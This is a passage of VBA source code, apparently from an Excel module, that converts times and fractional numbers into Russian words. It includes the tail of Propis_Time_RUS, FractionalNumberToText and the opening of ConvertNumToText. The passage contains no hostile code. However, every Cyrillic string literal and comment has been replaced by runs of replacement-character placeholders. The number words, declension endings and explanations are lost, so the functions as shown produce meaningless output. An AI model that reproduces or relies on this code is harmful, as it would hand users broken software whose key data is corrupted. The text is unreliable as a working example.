    avThousands = Array("|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    sTime = Split(Format(iTime, "HH:MM:SS"), ":")
    sHours = sTime(0)
    sMinutes = sTime(1)
    sSeconds = sTime(2)
    If sHours > 0 Then avOne = Array("", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    If PodpisOnly = 0 Then
        sHour = funcTeens(sHours, IIf(Val(sHours), 0, 1)) & Text_All(sHours, "|fffd||fffd||fffd|")
        sMin = funcTeens(sMinutes, IIf(Val(sMinutes), 0, 1)) & Text_All(sMinutes, "|fffd||fffd||fffd|")
        sSec = funcTeens(sSeconds, IIf(Val(sSeconds), 0, 1)) & Text_All(sSeconds, "|fffd||fffd||fffd|")
    Else
        sHour = Val(sHours) & " " & Text_All(sHours, "|fffd||fffd||fffd|")
        sMin = Val(sMinutes) & " " & Text_All(sMinutes, "|fffd||fffd||fffd|")
        sSec = Val(sSeconds) & " " & Text_All(sSeconds, "|fffd||fffd||fffd|")
    End If
    Propis_Time_RUS = Trim(sHour & sMin & sSec)
End Function


' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ))
' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Function FractionalNumberToText(ByVal chislo$, Optional ByVal FractionDigits As Long = 0, _
                                Optional TextFractionPart As Boolean = True) As String
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: forum .vingrad .ru/act-ST/f-131/t-106328.html#
    On Error Resume Next
    Dim chislo2$, chislo3$, LengthChislo&, tekst$, Start&
    If FractionDigits > 3 Then FractionDigits = IIf(TextFractionPart, 3, 4)        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    chislo$ = Replace(Trim(chislo$), ".", ",")
    If InStr(1, chislo$, ",") Then
        chislo2 = Split(chislo, ",")(0)
        chislo3 = "0," & Split(chislo, ",", 2)(1)        '-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If FractionDigits Then chislo3 = Replace(Format(chislo3, "0." & String(FractionDigits, "0")), ".", ",")
        If TextFractionPart Then
            If Len(chislo3) > 5 Then chislo3 = Replace(Format(chislo3, "0.000"), ".", ",")
        Else
            If Len(chislo3) > 6 Then chislo3 = Replace(Format(chislo3, "0.0000"), ".", ",")
        End If
    Else
        chislo2 = chislo
    End If

    LengthChislo = Len(chislo2)        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Start = 0
    tekst = ""
    For x = LengthChislo To 1 Step -1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        Start = Start + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
        Select Case x
            Case 12        ' - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
            Case 11        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If num >= 1 And num <= 20 Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = Mid(chislo2, Start, 2) * 1
                    If Right(sclonMlrd, 1) * 1 = 0 Then sclonMlrd = 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd| 10
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                End If
            Case 10        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 1
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = Mid(chislo2, Start, 1) * 1
                '-------------------------------------------------------
            Case 9        ' - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
            Case 8        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If num >= 1 And num <= 20 Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = Mid(chislo2, Start, 2) * 1
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    If Right(sclon1000000, 1) * 1 = 0 Then sclon1000000 = 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  20
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                End If
            Case 7        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 1
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = Mid(chislo2, Start, 1) * 1
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                '-------------------------------------------------------
            Case 6        ' -  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
                If num <> 0 And Mid(chislo2, Start + 1, 1) = "0" _
                   And Mid(chislo2, Start + 2, 1) = "0" _
                   Then        '|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|,
                    sclon1000 = 0        '|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| sclon |fffd||fffd||fffd||fffd||fffd|
                    x = x - 2        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    Start = Start + 2        ' |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                End If
            Case 5        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If (num >= 1 And num <= 20) Or (num <> 0 And Right(num, 1) * 1 = 0) Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000 = Mid(chislo2, Start, 2) * 1
                    If Right(sclon1000, 1) * 1 = 0 Then sclon1000 = 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                End If
            Case 4        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                If Mid(chislo2, Start, 1) * 1 = 0 Then        '|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| sclon1000
                    num = Mid(chislo2, Start, 1) * 1
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                Else        ' -|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| sclon
                    num = Mid(chislo2, Start, 1) * 1
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000 = Mid(chislo2, Start, 1) * 1
                End If
                '-------------------------------------------------------
            Case 3        ' - |fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
            Case 2        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If (num >= 1 And num <= 20) Or (num <> 0 And Right(num, 1) * 1 = 0) Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                End If
            Case 1        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 1
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        End Select
        '-------------------------------------------------------
        Call ConvertNumToText(num, txt, x, txt2, chislo3)
        '-------------------------------------------------------
        If sclon1000 <> -1 Then
            Select Case sclon1000
                Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: scl = "|fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 5 To 19: scl = "|fffd||fffd||fffd||fffd||fffd|"
                Case 0: scl = "|fffd||fffd||fffd||fffd||fffd|"
            End Select
            scl2 = scl & " "
        End If
        If sclon1000000 <> -1 Then
            Select Case sclon1000000
                Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 5 To 19: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 0: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End Select
            scl2 = scl & " "
        End If
        If sclonMlrd <> -1 Then
            Select Case sclonMlrd
                Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 5 To 19: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 0: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End Select
            scl2 = scl & " "
        End If
        tekst = tekst & txt2 & scl2
    Next x

    ' <<<|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <<<
    If Len(chislo3$) Then
        If Right(chislo2, 1) = "1" Then tekst = tekst & " |fffd||fffd||fffd||fffd||fffd| " Else tekst = tekst & " |fffd||fffd||fffd||fffd||fffd| "

        LengthChislo = Len(chislo3) - 2
        ' - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1, |fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|. ",003"
        chislo3 = Right(chislo3, LengthChislo)
        Start = 0
        For x = LengthChislo To 1 Step -1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Start = Start + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            '<<<<<<<<
            Select Case x
                Case 4        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 1) * 1000
                    'sclon10000 = -1
                    sclon1000 = -1
                    sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon10 = -1
                    scl2 = ""
                Case 3        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 1) * 100
                    'sclon10000 = -1
                    sclon1000 = -1
                    sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon10 = -1
                    scl2 = ""
                Case 2        ' - |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 2) * 1
                    If (num >= 1 And num <= 20) Or (num <> 0 And Right(num, 1) * 1 = 0) Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                        If LengthChislo = 3 Then
                            sclon1000 = num
                        Else: sclon1000 = -1
                        End If
                        If LengthChislo = 2 Then
                            sclon100 = num
                        Else: sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        End If
                        If LengthChislo = 1 Then
                            sclon10 = num
                        Else: sclon10 = -1
                        End If
                        Start = Start + 1
                        x = x - 1
                    Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                        num = Mid(chislo3, Start, 1) * 10
                        sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        sclon10 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                Case 1        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 1) * 1
                    If LengthChislo = 3 Then
                        sclon1000 = num
                    Else: sclon1000 = -1
                    End If
                    If LengthChislo = 2 Then
                        sclon100 = num
                    Else: sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                    If LengthChislo = 1 Then
                        sclon10 = num
                    Else: sclon10 = -1
                    End If
            End Select
            '-------------------------------------------------------
            Call ConvertNumToText(num, txt, x, txt2, chislo3)
            '-------------------------------------------------------
            If sclon1000 <> -1 Then
                Select Case sclon1000
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If sclon100 <> -1 Then
                Select Case sclon100
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If sclon10 <> -1 Then
                Select Case sclon10
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If Len(chislo3) = 4 Then
                Select Case Right(chislo3, 1)
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If TextFractionPart Then tekst = tekst & txt2 & scl2
        Next x
    End If
    If Not TextFractionPart Then tekst = tekst & IIf(chislo3 <> "0", chislo3, "") & " " & scl2
    FractionalNumberToText = Application.Trim(tekst)
End Function

Sub ConvertNumToText(num, txt, x, txt2, chislo3)
    Select Case num
        Case 0: txt = "|fffd||fffd||fffd||fffd|"
        Case 1: txt = "|fffd||fffd||fffd||fffd|"
            If x = 4 Or (chislo3 <> 0 And x = 1) Then txt = "|fffd||fffd||fffd||fffd|"        ' (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
        Case 2: txt = "|fffd||fffd||fffd|"
            If x = 4 Or (chislo3 <> 0 And x = 1) Then txt = "|fffd||fffd||fffd|"        ' (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
        Case 3: txt = "|fffd||fffd||fffd|"
        Case 4: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 5: txt = "|fffd||fffd||fffd||fffd|"
        Case 6: txt = "|fffd||fffd||fffd||fffd||fffd|"
        Case 7: txt = "|fffd||fffd||fffd||fffd|"
        Case 8: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 9: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 10: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 11: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 12: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 13: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 14: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 15: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 16: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 17: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 18: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 19: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 20: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 30: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 40: txt = "|fffd||fffd||fffd||fffd||fffd|"
        Case 50: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 60: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 70: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 80: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
